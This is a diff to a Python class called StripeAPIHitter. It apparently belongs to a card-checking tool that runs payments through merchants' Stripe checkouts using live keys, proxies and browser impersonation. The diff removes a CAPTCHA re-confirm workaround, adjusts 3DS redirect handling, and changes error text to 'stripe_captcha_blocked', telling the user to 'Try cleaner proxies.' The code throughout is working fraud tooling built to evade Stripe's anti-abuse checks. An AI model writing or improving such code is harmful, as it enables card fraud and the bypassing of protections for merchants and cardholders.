@@ -1362,77 +1362,25 @@ class StripeAPIHitter:
                                     or next_action.get("source")
                                 )
 
-                                # If CAPTCHA triggered and no source found, re-confirm with fresh 3DS path
-                                if captcha_triggered and not source:
-                                    try:
-                                        if is_pi or is_seti:
-                                            reconfirm_data = {
-                                                "payment_method": pm_id,
-                                                "expected_payment_method_type": "card",
-                                                "key": self.pk_live,
-                                                "client_secret": self.cs_live
-                                            }
-                                        else:
-                                            reconfirm_data = {
-                                                "payment_method": pm_id,
-                                                "expected_payment_method_type": "card",
-                                                "payment_method_options[card][request_three_d_secure]": "any",
-                                                "consent[terms_of_service]": "accepted",
-                                                "key": self.pk_live,
-                                            }
-                                        if self.raw_amount is not None and self.raw_amount > 0:
-                                            reconfirm_data["expected_amount"] = self.raw_amount
-                                        import uuid as _uuid
-                                        reconfirm_headers = headers.copy()
-                                        reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
-                                        await asyncio.sleep(1)
-                                        reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data,
-                                            proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
-                                        reconfirm_json = reconfirm_res.json()
-                                        rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
-                                        rc_status = rc_pi.get('status') if isinstance(rc_pi, dict) else None
-                                        if rc_status in ['succeeded', 'requires_capture', 'complete']:
-                                            result['success'] = True
-                                            receipt_url = find_receipt_url(reconfirm_json)
-                                            if receipt_url:
-                                                result['receipt_url'] = receipt_url
-                                            return result
-                                        elif rc_status in ['requires_action', 'requires_source_action']:
-                                            rc_sdk = (rc_pi.get('next_action', {}) or {}).get('use_stripe_sdk', {}) or {}
-                                            source = (
-                                                rc_sdk.get("three_d_secure_2_source")
-                                                or rc_sdk.get("source")
-                                                or (rc_pi.get('next_action', {}) or {}).get("source")
-                                            )
-                                            # Update intent for downstream polling
-                                            if isinstance(rc_pi, dict) and rc_pi.get('id'):
-                                                pi = rc_pi.get('id')
-                                                intent_id = pi
-                                                client_secret = rc_pi.get('client_secret') or client_secret
-                                                res = rc_pi
-                                                next_action = rc_pi.get('next_action', {}) or {}
-                                                sdk = next_action.get('use_stripe_sdk', {}) or {}
-                                    except Exception:
-                                        pass
                                 state = None
 
                                 is_legacy_3ds = (
                                     res.get("status") == "requires_source_action"
                                     or sdk.get("type") == "three_d_secure_redirect"
                                     or next_action.get("type") == "redirect_to_url"
-                                    or bool(confirm_json.get("url"))
+                                    or bool(res.get("url"))
                                 )
                                 processed_auth = False
 
                                 if is_legacy_3ds:
-                                    redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
+                                    redirect_url = res.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
                                     if isinstance(redirect_url, str):
                                         redir_headers = {
                                             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                                             "user-agent": profile["user_agent"]
                                         }
                                         await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    await asyncio.sleep(2)
                                     state = "redirected"
                                     processed_auth = True
                                 elif source:
@@ -1520,13 +1468,9 @@ class StripeAPIHitter:
                                     if isinstance(err, dict) and err.get('message'):
                                         result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                         result['error'] = err.get('message', 'Unknown error')
-                                    elif captcha_triggered:
-                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
-                                        try:
-                                            _raw_dump = json.dumps(confirm_json, indent=None, default=str)
-                                        except Exception:
-                                            _raw_dump = str(confirm_json)
-                                        result['error'] = f'rqdata_captcha | raw: {_raw_dump}'
+                                    elif captcha_triggered and not source:
+                                        result['decline_code'] = 'stripe_captcha_blocked'
+                                        result['error'] = 'Stripe CAPTCHA (rqdata) blocked — no 3DS source available. Try cleaner proxies.'
                                     else:
                                         result['decline_code'] = status_2 or '3ds_unknown'
                                         result['error'] = f"3ds_challenge_unresolved"
